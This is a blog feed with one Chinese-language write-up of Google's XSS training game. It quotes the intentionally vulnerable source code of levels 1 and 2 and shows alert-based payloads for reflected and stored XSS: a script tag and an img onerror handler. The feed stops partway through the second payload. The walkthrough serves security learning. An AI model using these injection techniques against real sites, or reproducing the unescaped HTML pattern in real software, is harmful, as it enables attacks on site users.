<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Err0r</title>
  
  <subtitle>gyy</subtitle>
  <link href="https://err0r.top/atom.xml" rel="self"/>
  
  <link href="https://err0r.top/"/>
  <updated>2021-04-24T09:03:13.964Z</updated>
  <id>https://err0r.top/</id>
  
  <author>
    <name>gyy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xss学习</title>
    <link href="https://err0r.top/article/xss/"/>
    <id>https://err0r.top/article/xss/</id>
    <published>2021-04-24T05:24:44.000Z</published>
    <updated>2021-04-24T09:03:13.964Z</updated>
    
    <content type="html"><![CDATA[<p>谷歌的小游戏，复习一下xss</p><a id="more"></a><p>项目地址：<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><a href="https://xss-game.appspot.com/level1/frame">https://xss-game.appspot.com/level1/frame</a></p><pre class="language-python" data-language="python"><code class="language-python">page_header <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!doctype html>&lt;html>  &lt;head>    &lt;!-- Internal game scripts/styles, mostly boring stuff -->    &lt;script src="/static/game-frame.js">&lt;/script>    &lt;link rel="stylesheet" href="/static/game-frame-styles.css" />  &lt;/head>   &lt;body id="level1">    &lt;img src="/static/logos/level1.png">      &lt;div>"""</span> page_footer <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;/div>  &lt;/body>&lt;/html>"""</span> main_page_markup <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;form action="" method="GET">  &lt;input id="query" name="query" value="Enter query here..."    onfocus="this.value=''">  &lt;input id="button" type="submit" value="Search">&lt;/form>"""</span> <span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_string</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main search page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> main_page_markup <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span>       <span class="token comment"># Display the results page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> message <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>关键部分</p><pre class="language-python" data-language="python"><code class="language-python">query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span></code></pre><p><code>Sorry, no results were found for &lt;b&gt; + query + &lt;/b&gt;.</code></p><p>GET请求query会直接填入网页html</p><img src="/article/xss/image-20210424143837616.png" class="" title="level1-1" loading="lazy"><p>直接打即可，payload:</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><img src="/article/xss/image-20210424143953579.png" class="" title="level1-2" loading="lazy"><hr><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><a href="https://xss-game.appspot.com/level2/frame">https://xss-game.appspot.com/level2/frame</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- This is our database of messages --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/post-store.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">var</span> defaultMessage <span class="token operator">=</span> <span class="token string">"Welcome!&lt;br>&lt;br>This is your &lt;i>personal&lt;/i>"</span>        <span class="token operator">+</span> <span class="token string">" stream. You can post anything you want here, especially "</span>        <span class="token operator">+</span> <span class="token string">"&lt;span style='color: #f00ba7'>madness&lt;/span>."</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> <span class="token constant">DB</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PostDB</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">function</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> containerEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"post-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> posts <span class="token operator">=</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>           html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'clear-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> message <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level2.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Chatter from across the Web.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Clear all posts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">valign</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level2_icon.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shim<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-content<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span>              <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>share<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Share status!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sign<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Post-store.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* * Objects to implement a client-side post database. */</span> <span class="token keyword">function</span> <span class="token function">Post</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function">PostDB</span><span class="token punctuation">(</span><span class="token parameter">defaultMessage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Initial message to display to users</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_defaultMessage <span class="token operator">=</span> defaultMessage <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">setup</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> defaultPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string">"posts"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>defaultPost<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">save</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> newPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> allPosts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    allPosts<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPost<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string">"posts"</span> <span class="token operator">:</span> allPosts    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">clear</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">getPosts</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>posts<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>关键代码</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span> <span class="token comment">//这还少个 '>' 23333</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span></code></pre><p>可以发现我们提交的内容输出字段会被<code>&lt;blockquote&gt;</code>包裹，考虑到数据是存储的服务器上的可以利用存储型xss，利用<code>onerror</code>事件来进行xss</p><blockquote><p>onerror 事件在视频/音频（audio/video）数据加载期间发生错误时触发。</p></blockquote><p>利用img标签加载一个不存在的对象，会触发onerror事件</p><p>payload：</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span><span class="token string">"javascript:alert(1);"</span><span 